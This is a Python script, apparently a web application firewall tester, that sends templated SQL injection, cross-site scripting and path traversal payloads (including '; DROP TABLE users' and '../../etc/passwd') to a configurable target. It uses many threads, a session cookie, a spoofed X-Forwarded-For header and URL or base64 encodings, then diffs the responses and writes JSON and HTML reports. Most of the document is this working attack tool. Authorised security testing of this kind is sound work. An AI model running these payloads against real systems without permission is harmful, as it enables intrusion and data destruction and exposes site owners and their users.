import requests
import itertools
from concurrent.futures import ThreadPoolExecutor
import urllib.parse
import base64
import json
import os
import time
from difflib import unified_diff
from html import escape

# Advanced Configurations
TARGET_URL = "https://your-web-application.com/test"
AUTH_COOKIE = {"session": "your_session_cookie_here"}  # Set if required
THREADS = 10
PAYLOAD_TEMPLATES = [
    "{prefix}' OR '1'='1' --",
    "<script>{payload}</script>",
    "../../{payload}/etc/passwd",
    "UNION SELECT {payload},null,null",
    "{payload}; DROP TABLE users",
]
DYNAMIC_PAYLOADS = ["XSS", "SQLi", "Traversal", "NULL"]
METHODS = ["GET", "POST"]
HEADERS = [
    {"User-Agent": "Mozilla/5.0", "Referer": "https://example.com"},
    {"X-Forwarded-For": "127.0.0.1"},
]
ENCODINGS = ["plain", "url", "base64"]
RESULTS_DIR = "./results"

# Function to encode payloads
def encode_payload(payload, encoding):
    if encoding == "plain":
        return payload
    elif encoding == "url":
        return urllib.parse.quote(payload)
    elif encoding == "base64":
        return base64.b64encode(payload.encode()).decode()

# Generate dynamic payloads
def generate_payloads():
    payloads = []
    for template in PAYLOAD_TEMPLATES:
        for dynamic in DYNAMIC_PAYLOADS:
            payloads.append(template.format(payload=dynamic, prefix=""))
            payloads.append(template.format(payload=dynamic, prefix="/"))
    return payloads

# Baseline response comparison
def get_baseline_response():
    try:
        baseline_response = requests.get(TARGET_URL, timeout=10)
        return baseline_response.text, baseline_response.status_code
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Failed to fetch baseline response: {e}")
        return None, None

# Function to test a single payload
def test_payload(payload, method, headers, baseline_response, baseline_status):
    results = []
    for encoding in ENCODINGS:
        encoded_payload = encode_payload(payload, encoding)
        print(f"[{method}] Testing payload (encoded as {encoding}): {encoded_payload}")
        try:
            if method == "GET":
                response = requests.get(
                    TARGET_URL, params={"input": encoded_payload}, headers=headers, cookies=AUTH_COOKIE, timeout=10
                )
            elif method == "POST":
                response = requests.post(
                    TARGET_URL, data={"input": encoded_payload}, headers=headers, cookies=AUTH_COOKIE, timeout=10
                )

            # Analyze response
            diff = "\n".join(
                unified_diff(
                    baseline_response.splitlines(),
                    response.text.splitlines(),
                    lineterm="",
                )
            )
            if response.status_code != baseline_status or diff:
                results.append(
                    {
                        "payload": encoded_payload,
                        "encoding": encoding,
                        "method": method,
                        "status": response.status_code,
                        "response_diff": diff,
                        "headers": response.headers,
                    }
                )
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Payload {encoded_payload} caused an error: {e}")
    return results

# Function to test all payloads
def run_tests():
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)

    print("[INFO] Fetching baseline response...")
    baseline_response, baseline_status = get_baseline_response()
    if baseline_response is None:
        print("[ERROR] Baseline response could not be fetched. Aborting tests.")
        return

    payloads = generate_payloads()
    results = []

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        test_combinations = list(itertools.product(payloads, METHODS, HEADERS))
        futures = [
            executor.submit(test_payload, *combination, baseline_response, baseline_status)
            for combination in test_combinations
        ]

        for future in futures:
            try:
                result = future.result()
                if result:
                    results.extend(result)
            except Exception as e:
                print(f"[ERROR] Test execution failed: {e}")

    # Save results
    results_file = os.path.join(RESULTS_DIR, "waf_test_results.json")
    with open(results_file, "w") as f:
        json.dump(results, f, indent=4)
    print(f"\n[INFO] Test completed. Results saved to {results_file}")

    generate_html_report(results)

# Generate an HTML report
def generate_html_report(results):
    html = """
    <html>
    <head><title>WAF Test Results</title></head>
    <body>
    <h1>WAF Test Results</h1>
    <table border="1">
    <tr>
        <th>Payload</th>
        <th>Encoding</th>
        <th>Method</th>
        <th>Status</th>
        <th>Response Diff</th>
    </tr>
    """
    for result in results:
        html += f"""
        <tr>
            <td>{escape(result['payload'])}</td>
            <td>{result['encoding']}</td>
            <td>{result['method']}</td>
            <td>{result['status']}</td>
            <td><pre>{escape(result['response_diff'])}</pre></td>
        </tr>
        """
    html += """
    </table>
    </body>
    </html>
    """
    report_file = os.path.join(RESULTS_DIR, "waf_test_results.html")
    with open(report_file, "w") as f:
        f.write(html)
    print(f"[INFO] HTML report saved to {report_file}")

# Run the tests
if __name__ == "__main__":
    start_time = time.time()
    print(f"Starting advanced WAF testing on {TARGET_URL}...\n")
    run_tests()
    end_time = time.time()
    print(f"\nTesting completed in {end_time - start_time:.2f} seconds.")
